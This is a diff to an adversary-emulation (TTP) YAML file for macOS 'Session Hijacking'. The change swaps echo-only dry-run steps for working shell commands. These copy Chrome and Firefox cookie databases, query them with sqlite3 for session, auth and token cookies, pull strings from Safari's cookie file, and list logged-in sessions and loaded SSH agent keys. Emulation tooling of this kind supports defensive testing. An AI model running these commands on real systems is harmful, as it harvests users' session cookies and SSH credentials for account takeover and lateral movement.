@@ -5,7 +5,9 @@ name: Session Hijacking
 authors:
 - Claude Code
 description: |
-  Hijack active user sessions to gain unauthorized macOS system access
+  Extract browser session cookies and enumerate active sessions on a macOS system.
+  Copies and queries browser cookie databases from Chrome, Safari, and Firefox,
+  lists active user sessions, and checks for SSH agent forwarding credentials.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -17,52 +19,97 @@ requirements:
   platforms:
   - os: darwin
 args:
-- name: target_account
-  description: Target account with active session to hijack
+- name: browser
+  description: Primary browser to extract session cookies from (chrome, firefox, safari)
   type: string
-- name: password_list
-  description: Path to file containing session tokens or cookies
-  type: string
-- name: leaked_creds_file
-  description: Path to file with leaked session data
-  type: string
-- name: oauth_token
-  description: Stolen session token or cookie
-  type: string
+  default: chrome
 steps:
-- name: identify_active_sessions
-  description: Identify active user sessions on target macOS
+- name: extract_chrome_cookies
+  description: Extract session cookies from Google Chrome cookie database
   inline: |
-    echo "Identifying active sessions for: ${target_account}"
-    # Dry run: simulate session enumeration
-    echo "Active session enumeration in progress"
-- name: extract_session_tokens
-  description: Extract session tokens and cookies from leaked data
-  inline: |
-    echo "Extracting session tokens from breach data"
-    if [ -f "${leaked_creds_file}" ]; then
-      wc -l < "${leaked_creds_file}" | xargs echo "Session tokens found:"
+    echo "=== Extracting Chrome Session Cookies ==="
+    chrome_cookies="$HOME/Library/Application Support/Google/Chrome/Default/Cookies"
+    if [ -f "$chrome_cookies" ]; then
+      cp "$chrome_cookies" /tmp/ttp_chrome_cookies.db 2>/dev/null
+      echo "--- Active session cookies (by domain) ---"
+      sqlite3 /tmp/ttp_chrome_cookies.db "SELECT host_key, name, path, datetime(expires_utc/1000000-11644473600,'unixepoch') as expires FROM cookies WHERE expires_utc > strftime('%s','now')*1000000+11644473600000000 ORDER BY host_key LIMIT 30;" 2>/dev/null || echo "Could not query Chrome cookies (database may be locked)"
+      echo ""
+      echo "--- Session cookies (no expiry - active sessions) ---"
+      sqlite3 /tmp/ttp_chrome_cookies.db "SELECT host_key, name, path FROM cookies WHERE expires_utc = 0 OR is_persistent = 0 LIMIT 20;" 2>/dev/null || true
+      echo ""
+      echo "--- Authentication-related cookies ---"
+      sqlite3 /tmp/ttp_chrome_cookies.db "SELECT host_key, name FROM cookies WHERE name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%' OR name LIKE '%sid%' OR name LIKE '%JSESSIONID%' OR name LIKE '%csrftoken%' LIMIT 30;" 2>/dev/null || true
+    else
+      echo "Chrome cookies database not found"
     fi
-- name: validate_session_tokens
-  description: Validate extracted session tokens for usability
+- name: extract_firefox_cookies
+  description: Extract session cookies from Firefox cookie database
   inline: |
-    echo "Validating session tokens"
-    if [ -f "${password_list}" ]; then
-      # Dry run: simulate token validation
-      count=$(wc -l < "${password_list}")
-      echo "Validated ${count} session tokens"
+    echo "=== Extracting Firefox Session Cookies ==="
+    ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
+    if [ -d "$ff_profiles" ]; then
+      find "$ff_profiles" -name "cookies.sqlite" 2>/dev/null | while read -r db; do
+        echo "--- Firefox profile: $(dirname "$db" | xargs basename) ---"
+        cp "$db" /tmp/ttp_ff_cookies.db 2>/dev/null
+        echo "Session/auth cookies:"
+        sqlite3 /tmp/ttp_ff_cookies.db "SELECT host, name, path FROM moz_cookies WHERE name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%' OR name LIKE '%sid%' LIMIT 30;" 2>/dev/null || echo "Could not query Firefox cookies"
+        rm -f /tmp/ttp_ff_cookies.db
+      done
+    else
+      echo "Firefox profiles not found"
     fi
-- name: hijack_session
-  description: Use stolen session token to hijack active session
+- name: extract_safari_cookies
+  description: Extract Safari cookie information
   inline: |
-    echo "Attempting to hijack session"
-    # Dry run: simulate session hijacking
-    echo "Session hijacking attempt in progress"
+    echo "=== Extracting Safari Cookie Information ==="
+    safari_cookies="$HOME/Library/Cookies/Cookies.binarycookies"
+    if [ -f "$safari_cookies" ]; then
+      echo "Safari binary cookies file found: $safari_cookies"
+      ls -la "$safari_cookies"
+      echo "(Binary format - attempting to extract readable strings)"
+      strings "$safari_cookies" 2>/dev/null | grep -iE "session|auth|token|\.com|\.org" | sort -u | head -30
+    else
+      echo "Safari cookies file not found"
+    fi
+    # Also check Safari's WebKit cookie storage
+    webkit_cookies="$HOME/Library/WebKit/com.apple.Safari/WebsiteData/CookieStorage"
+    if [ -d "$webkit_cookies" ] || [ -f "$webkit_cookies" ]; then
+      echo "WebKit cookie storage found"
+      ls -la "$webkit_cookies" 2>/dev/null
+    fi
+- name: enumerate_active_sessions
+  description: List active user sessions and check SSH agent forwarding
+  inline: |
+    echo "=== Enumerating Active Sessions ==="
+    echo "--- Logged in users ---"
+    who -a 2>/dev/null || who 2>/dev/null
+    echo ""
+    echo "--- Current user sessions (w) ---"
+    w 2>/dev/null || true
+    echo ""
+    echo "--- Last logins ---"
+    last -10 2>/dev/null || true
+    echo ""
+    echo "=== Checking SSH Agent ==="
+    echo "--- SSH Agent keys ---"
+    ssh_keys=$(ssh-add -l 2>&1)
+    echo "$ssh_keys"
+    if echo "$ssh_keys" | grep -q "^[0-9]"; then
+      echo "WARNING: SSH agent has loaded keys that could be used for lateral movement"
+    fi
+    echo ""
+    echo "--- SSH agent socket ---"
+    echo "SSH_AUTH_SOCK: ${SSH_AUTH_SOCK:-not set}"
+    if [ -n "$SSH_AUTH_SOCK" ]; then
+      ls -la "$SSH_AUTH_SOCK" 2>/dev/null || true
+    fi
+    echo ""
+    echo "--- Active SSH connections ---"
+    lsof -i :22 2>/dev/null | head -10 || true
   cleanup:
     inline: |
-      echo "Revoking stolen session tokens"
-
-      echo "Terminating hijacked sessions"
+      echo "Removing temporary cookie databases"
+      rm -f /tmp/ttp_chrome_cookies.db /tmp/ttp_ff_cookies.db
 tests:
 - name: dry_run_test
   dry_run: true
